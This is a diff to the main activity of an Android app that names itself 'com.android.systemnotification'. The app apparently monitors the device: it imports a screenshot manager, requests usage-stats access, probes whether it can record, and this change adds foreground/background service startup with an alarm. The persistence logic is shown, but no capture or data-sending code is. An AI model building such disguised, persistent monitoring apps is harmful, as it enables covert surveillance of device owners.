@@ -7,11 +7,13 @@ import android.content.Intent;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
+import android.util.Log;
 import android.view.View;
 
 import com.android.systemnotification.utils.Alarm;
 import com.android.systemnotification.utils.BackgroundService;
 import com.android.systemnotification.utils.ClassHelper;
+import com.android.systemnotification.utils.ForegroundService;
 import com.android.systemnotification.utils.ScreenshotManager;
 
 import androidx.appcompat.app.AppCompatActivity;
@@ -54,22 +56,24 @@ public class MainActivity extends AppCompatActivity {
         requestUsageStatsPermission();
 
         ClassHelper classHelper = new ClassHelper();
-        if (classHelper.isMyServiceRunning(BackgroundService.class, MainActivity.this)) {
 
+        if (!classHelper.isMyServiceRunning(BackgroundService.class, this)) {
 
-        } else {
-            Intent intent = new Intent(MainActivity.this, BackgroundService.class);
-            startService(intent);
+            Intent foregroundService = new Intent(this, ForegroundService.class);
+            Intent backgroundService = new Intent(this, BackgroundService.class);
+
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                startForegroundService(foregroundService);
+            } else {
+                //lower then Oreo, just start the service.
+                startService(backgroundService);
+            }
 
             Alarm alarm = new Alarm();
-            alarm.setAlarm(MainActivity.this);
+            alarm.setAlarm(this);
         }
 
-        //startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
-
         findViewById(R.id.checkIfPossibleToRecordButton).performClick();
-
-
     }
 
     @Override
